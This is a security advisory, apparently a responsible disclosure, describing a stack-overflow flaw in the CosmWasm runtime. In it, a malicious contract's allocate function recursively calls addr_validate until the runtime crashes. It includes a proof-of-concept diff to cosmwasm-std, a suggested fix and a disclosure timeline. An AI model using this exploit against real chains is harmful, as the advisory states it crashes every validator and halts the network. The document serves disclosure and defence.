# CosmWasm allocate stack overflow

## Summary
The CosmWasm runtime defines several imports, functions that can be called from a WASM contract to write state changes, perform validations or offload expensive cryptographic operations to native implementations.

These functions use a helper method called `write_to_contract` to write results or error messages into the WASM address space:

```bash
fn write_to_contract<A: BackendApi, S: Storage, Q: Querier>(
    env: &Environment<A, S, Q>,
    input: &[u8],
) -> VmResult<u32> {
    let out_size = to_u32(input.len())?;
    let result = env.call_function1("allocate", &[out_size.into()])?; **(A)**
    let target_ptr = ref_to_u32(&result)?;
    if target_ptr == 0 {
        return Err(CommunicationError::zero_address().into());
    }
    write_region(&env.memory(), target_ptr, input)?;
    Ok(target_ptr)
}
```

Interestingly, `write_to_contract` itself calls back into the WASM runtime in (A). The call to the `allocate` function is used to ask the smart contract to allocate a sufficiently large memory block in its address space that the runtime can write into.

In a non-malicious contract, the `allocate` function is provided by the cosmwasm-std standard library and this pattern works without problems.

However, a malicious contract can easily provide its own implementation that triggers a stack overflow through deeply nested recursion: Instead of returning the address of a free memory range directly, `allocate` can instead call back into the Cosmwasm runtime instead. If this import triggers `write_to_contract` again we end up in a recursive loop.

One easy example is the `addr_validate` import:

```bash
pub fn do_addr_validate<A: BackendApi, S: Storage, Q: Querier>(
    env: &Environment<A, S, Q>,
    source_ptr: u32,
) -> VmResult<u32> {
    let source_data = read_region(&env.memory(), source_ptr, MAX_LENGTH_HUMAN_ADDRESS)?;
    if source_data.is_empty() {
        return write_to_contract::<A, S, Q>(env, b"Input is empty");
    }
[..]
```

When called with an empty input, the function immediately calls `write_to_contract` with an error message. (This happens before Gas fees are deducted so the FFI call does not incur any additional costs)

By adding a call to `addr_validate` to our contracts `allocate` function we end up with the following call graph during contract instantiation, which repeats until the process crashes with a stack overflow:

runtime:instantiate → wasm:allocate → runtime:do_addr_validate → wasm:allocate → runtime:do_addr_validate → wasm:allocate → runtime:do_addr_validate → ..

## Proof of Concept

Apply the attached patch to the upstream [cosmwasm](https://github.com/CosmWasm/cosmwasm) repo, build any of the included contracts and run their integration tests. You should see an error message demonstrating the stack overflow: `fatal runtime error: stack overflow` 

Instantiating a contract with the malicious `allocate()` implementation on a chain, leads to a crash of all validators and halts the chain. 

```bash
diff --git a/packages/std/src/memory.rs b/packages/std/src/memory.rs
index c331a53c..09462d25 100644
--- a/packages/std/src/memory.rs
+++ b/packages/std/src/memory.rs
@@ -15,9 +15,21 @@ pub struct Region {
     pub length: u32,
 }
 
+
+extern "C" {
+    fn addr_validate(source_ptr: u32) -> u32;
+}
+
 /// Creates a memory region of capacity `size` and length 0. Returns a pointer to the Region.
 /// This is the same as the `allocate` export, but designed to be called internally.
 pub fn alloc(size: usize) -> *mut Region {
+
+    let source = build_region("".as_bytes());
+    let source_ptr = &*source as *const Region as u32;
+
+    let result = unsafe { addr_validate(source_ptr) };
+
+
     let data: Vec<u8> = Vec::with_capacity(size);
     let data_ptr = data.as_ptr() as usize;

```

## Suggested Fix

Add a check to `call_function` ([https://github.com/CosmWasm/cosmwasm/blob/32f308a1a56ae5b8278947891306f7a374c3df94/packages/vm/src/environment.rs#L164](https://github.com/CosmWasm/cosmwasm/blob/32f308a1a56ae5b8278947891306f7a374c3df94/packages/vm/src/environment.rs#L164)) to enforce the maximum call depth between runtime and the contract.


## Timeline 
- 2023-02-27 Report to CosmWasm security team
- 2023-04-18 [Patch](https://github.com/CosmWasm/cosmwasm/commit/3795f5cd03288405335d4fb0c46c239dbf4c7e60) is released
- 2023-04-20 [CosmWasm Advisory](https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-002.md) is released
- 2023-06-01 Jump Crypto security advisory is released
